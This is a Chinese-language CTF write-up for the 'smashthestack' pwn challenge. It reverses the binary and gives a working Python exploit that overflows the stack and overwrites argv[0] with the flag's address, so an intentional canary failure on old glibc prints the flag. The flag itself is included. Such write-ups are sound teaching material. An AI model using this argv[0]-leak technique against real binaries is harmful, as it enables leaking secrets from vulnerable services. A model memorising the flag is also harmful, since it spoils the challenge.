# PHM #67 Pwn — smashthestack

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 100 |

## 題目

> `nc ctf.hackme.quest 7717`, Tips: stderr is available, beware of the output
>
> Binary: [`/static/smash-the-stack`](https://ctf.hackme.quest/static/smash-the-stack)

## 分析

32-bit ELF, NX on, canary 開, non-PIE, dynamically linked.

`main` 的邏輯 (reversed):

```c
int main() {
    int fd = open("flag", 0);
    int len = read(fd, 0x804a060, 0x400);   // flag → .bss @ 0x804a060
    close(fd);
    if (len > 0x1f) {
        write(1, "Try to read the flag\n", 0x15);
        read(0, &len, 0x10000);               // ← stack overflow 入口
        write(1, &len, len);                  // ← echo len bytes from &len
    } else { ... }
    // canary check ... epilogue (pop ecx; lea esp, [ecx-4]; ret)
}
```

### 關鍵點

1. **flag 已經在 .bss (`0x804a060`) 讀好了**, 不用再開檔
2. `write(1, &len, len)` 把**我們指定的 len bytes** 從 stack 吐出來 — 這個是 leak primitive
3. `read(0, &len, 0x10000)` 可以塞到 65K bytes → 大 overflow, 肯定會打到 canary

### 卡住的點: canary 不知道怎麼跨

單一連線裡 `read` 回來後 server 馬上做 `write` → canary check → return. 中間沒有第二次 read 可以利用 leak 的 canary. 每個連線都是新 process, canary 重 random, 做不到 leak-then-exploit.

### 真正的解: 不用繞 canary, 讓它故意失敗

Tips 說 "stderr is available". `__stack_chk_fail` → `__fortify_fail` → 噴訊息:

```
*** stack smashing detected ***: ./smash-the-stack terminated
```

那個 `./smash-the-stack` 是 `__libc_argv[0]`. **`__libc_argv` 是 libc 的 global pointer, 指到 stack 上的 argv 陣列**. 如果把 stack 上 argv[0] 的 slot 覆蓋成 `0x804a060` (flag buffer), 噴錯訊息時就會印 flag.

overflow 到 argv[0] slot 的 offset 在 ~160-200 bytes 之間 (ASLR 下有抖動). **噴整段 `\x60\xa0\x04\x08` 覆蓋 ~200 bytes** 就 cover 住所有可能位置, 一次中.

## 解法

```python
import socket, struct

# payload = len (4 bytes) + 50 份 0x804a060 (200 bytes) spray
payload = struct.pack('<I', 4) + struct.pack('<I', 0x804a060) * 50

s = socket.create_connection(('ctf.hackme.quest', 7717))
s.send(payload)
s.shutdown(socket.SHUT_WR)
data = b''
while True:
    c = s.recv(4096)
    if not c: break
    data += c
# b"...stack smashing detected ***: FLAG{...} terminated"
```

## Flag

```
FLAG{Smash the stack, leaks the flag!}
```

## 感想

題目名字就是解法, 但繞法跟直覺不一樣. 一般「smash the stack」是打 ret addr 做 code exec; 這題打 **argv[0] 讓 glibc 自己把 flag 噴出來**, 完全不用寫 shellcode / ROP / canary bypass.

**關鍵觀察**: 這個 trick 只在**舊版 glibc (< 2.26)** 可行 — 新版 `__fortify_fail` 已經不帶 argv[0]:

```c
// 舊: 噴程式名
__libc_message(..., "*** %s ***: %s terminated\n", msg, __libc_argv[0]);
// 新 (2.26+): 不帶 argv[0]
__libc_message(..., "*** %s ***: terminated\n", msg);
```

PHM server 的 glibc 老夠, 這招吃得下.
